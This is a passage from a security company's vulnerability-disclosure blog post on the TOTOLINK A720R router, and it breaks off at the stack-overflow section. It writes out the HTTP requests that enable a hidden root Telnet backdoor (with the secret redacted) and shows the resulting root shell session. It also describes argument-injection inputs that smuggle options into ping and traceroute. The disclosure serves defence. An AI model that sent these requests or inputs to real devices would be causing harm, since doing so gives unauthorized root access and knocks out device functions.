---
title: One Router, Three Vulnerabilities: Security Research on the TOTOLINK A720R
url: https://www.hacktivesecurity.com/blog/2026/09/16/one-router-three-vulnerabilities-security-research-on-the-totolink-a720r/
source: Over Security
date: 2026-09-16
fetch_date: 2026-09-17T07:00:06.410783
---

# One Router, Three Vulnerabilities: Security Research on the TOTOLINK A720R

* info@hacktivesecurity.com
* Mon - Fri: 9.00 am - 6.00 pm

Advanced Security Solutions to protect the Cyberspace.

[Twitter](https://x.com/hacktivesec)

[Facebook-f](https://www.facebook.com/hacktivesec)

[Linkedin-in](https://www.linkedin.com/company/hacktive-security/)

[Instagram](https://www.instagram.com/hacktivesec/)

[![Hacktive Security](https://www.hacktivesecurity.com/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

* [Home](https://www.hacktivesecurity.com/)
* [About Us](https://www.hacktivesecurity.com/about-us/)
* Services
  + [Penetration Testing](https://www.hacktivesecurity.com/penetration-testing/)
  + [Red Teaming](https://www.hacktivesecurity.com/red-teaming/)
  + [Secure Code Review](https://www.hacktivesecurity.com/secure-code-review/)
  + [Training](https://www.hacktivesecurity.com/training/)
  + [Compliance](https://www.hacktivesecurity.com/compliance/)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [Careers](https://www.hacktivesecurity.com/careers/)
* [Contacts](https://www.hacktivesecurity.com/contacts/)

Search for:

### Have Any Questions?

+39-06-8773-8747

[free quote](https://www.hacktivesecurity.com/index.php/contacts/)

[![Hacktive Security](https://www.hacktivesecurity.com/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

Search for:

* [Home](https://www.hacktivesecurity.com/)
* [About Us](https://www.hacktivesecurity.com/about-us/)
* Services
  + [Penetration Testing](https://www.hacktivesecurity.com/penetration-testing/)
  + [Red Teaming](https://www.hacktivesecurity.com/red-teaming/)
  + [Secure Code Review](https://www.hacktivesecurity.com/secure-code-review/)
  + [Training](https://www.hacktivesecurity.com/training/)
  + [Compliance](https://www.hacktivesecurity.com/compliance/)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [Careers](https://www.hacktivesecurity.com/careers/)
* [Contacts](https://www.hacktivesecurity.com/contacts/)

[![Hacktive Security](http://176.31.202.211/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

Over 10 years we help companies reach their financial and branding goals. Engitech is a values-driven technology agency dedicated.

#### Gallery

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project11-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project11.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project10-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project10.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project4-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project4.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project6-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project6.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project2-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project2.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project1-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project1.jpg)

#### Contacts

Via Giosuè Carducci, 21 - Pomigliano d'Arco (Italy)
Paseo Montjuic, número 30 - Barcelona (Spain)

info@hacktivesecurity.com

+39 06 8773 8747

[Twitter](#hacktivesec)

Facebook-f

Pinterest-p

Instagram

# Hacktive Blog

* [Home](https://www.hacktivesecurity.com)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [Exploitation](https://www.hacktivesecurity.com/blog/category/expl/)
* One Router, Three Vulnerabilities: Security Research on the TOTOLINK A720R

[Exploitation](https://www.hacktivesecurity.com/blog/category/expl/) [Internet of Things](https://www.hacktivesecurity.com/blog/category/iot/) [Reverse Engineering](https://www.hacktivesecurity.com/blog/category/reverse-engineering/)

![](https://www.hacktivesecurity.com/wp-content/uploads/2026/09/router.png)

\_ [September 16, 2026](https://www.hacktivesecurity.com/blog/2026/09/16/one-router-three-vulnerabilities-security-research-on-the-totolink-a720r/)\_ [Nicola Giuffrida](https://www.hacktivesecurity.com/blog/author/ngiuffrida/)\_ [0 Comments](https://www.hacktivesecurity.com/blog/2026/09/16/one-router-three-vulnerabilities-security-research-on-the-totolink-a720r/#respond)

### One Router, Three Vulnerabilities: Security Research on the TOTOLINK A720R

The research was conducted on the TOTOLINK A720R router, on its latest available firmware. During said research, I identified three separate vulnerabilities affecting the same component handling the backend of the web management interface:

* **Telnet backdoor**: a hidden, unauthenticated Telnet service protected by a hardcoded secret.
* **Argument Injection (CVE-2025-63821)**: insufficient input validation allowing user-controlled arguments to be passed to diagnostic commands.
* **Stack-based Buffer Overflow (CVE-2026-82539)**: a stack overflow in the MAC filtering functionality allowing reliable control of the application’s execution flow.

Two of the findings were assigned CVEs, while the telnet backdoor was flagged as a duplicate of an old existing vulnerability (even though the means by which it is enabled and accessed are very different).

## The Research

The analysis started from the firmware. After extracting the filesystem, I focused on the web management interface and its CGI backend.

Most of the web application’s functionality is handled by a single binary, `cstecgi.cgi`. Reverse engineering of this file via static and dynamic analysis led to the identification of three vulnerabilities.

## The Telnet Backdoor

A hidden Telnet functionality was discovered in `cstecgi.cgi`. The functionality can be reached without authentication and relies on a hardcoded credential embedded in the firmware together with a predictable date-based value. The backdoor can be enabled by sending the following HTTP requests:

```
GET /cgi-bin/cstecgi.cgi?action=telnet&enable=1&password=BASE64_SECRET_REDACTED&code=07112026 HTTP/1.1
Host: 192.168.0.1
```

```
GET /cgi-bin/cstecgi.cgi?action=telnet&enable=2&password=BASE64_SECRET_REDACTED&code=07112026 HTTP/1.1
Host: 192.168.0.1
```

Once triggered, the device starts a Telnet service and provides access to a root shell, using the same password.

```
$ telnet 192.168.0.1

Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
TOTOLINK login: root
Password:
RLX Linux version 2.0

         _               _  _
        | |             | ||_|
   _  _ | | _  _        | | _ ____  _   _  _  _
  | |/ || |\ \/ /       | || |  _ \| | | |\ \/ /
  | |_/ | |/    \       | || | | | | |_| |/    \
  |_|   |_|\_/\_/       |_||_|_| |_|\____|\_/\_/

For further information check:
http://processor.realtek.com/

# ls
bin        etc        init       lighttp    proc       sys        usr        web_cste
dev        home       lib        mnt        root       tmp        var
```

## CVE-2025-63821

The diagnostic functionality was found to be vulnerable to argument injection due to insufficient validation of the user-controlled IP address field. By supplying a value beginning with **`-`**, an attacker can cause the input to be interpreted as an option by the underlying `traceroute` or `ping` command. The behavior can be observed in the Route Tracking functionality, where a crafted value results in an `invalid option` error being returned by `traceroute`.

![](https://www.hacktivesecurity.com/wp-content/uploads/2026/09/4.png)

In addition, the use of the **`#`** character allows the generated command to be modified in a way that leaves the Diagnosis functionality permanently unavailable. As shown below, after sending the crafted input, the Diagnosis button remains disabled even after reloading the page: rebooting the device is needed.

![](https://www.hacktivesecurity.com/wp-content/uploads/2026/09/3.png)

## CVE-2026-82539

A stack-based ...